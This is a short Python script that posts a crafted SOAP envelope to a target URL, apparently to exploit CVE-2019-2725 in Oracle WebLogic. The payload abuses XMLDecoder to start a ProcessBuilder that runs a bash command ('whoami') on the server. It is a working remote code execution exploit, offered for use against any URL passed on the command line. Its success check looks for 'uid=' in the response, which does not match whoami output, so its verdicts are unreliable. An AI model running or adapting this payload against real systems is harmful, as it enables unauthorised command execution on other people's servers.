import requests
import sys

def check_vulnerability(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36",
        "Content-Type": "text/xml;charset=UTF-8",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "SOAPAction": "''"
    }

    payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n   <soapenv:Header>\n      <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n         <java version=\"1.8.0_201\" class=\"java.beans.XMLDecoder\">\n            <void class=\"java.lang.ProcessBuilder\">\n               <array class=\"java.lang.String\" length=\"3\">\n                  <void index=\"0\">\n                     <string>/bin/bash</string>\n                  </void>\n                  <void index=\"1\">\n                     <string>-c</string>\n                  </void>\n                  <void index=\"2\">\n                     <string>whoami</string>\n                  </void>\n               </array>\n               <void method=\"start\"/>\n            </void>\n         </java>\n      </work:WorkContext>\n   </soapenv:Header>\n   <soapenv:Body/>\n</soapenv:Envelope>"
    
    try:
        response = requests.post(url, headers=headers, data=payload, timeout=10)
        if "uid=" in response.text:
            print(f"[+] The target is vulnerable to CVE-2019-2725.\n")
            print(f"[*] Response: \n{response.text}")
        else:
            print("[-] The target is not vulnerable to CVE-2019-2725.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Connection error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"[-] Usage: python {sys.argv[0]} http://target_url")
        sys.exit(1)
    else:
        url = sys.argv[1]
        check_vulnerability(url)
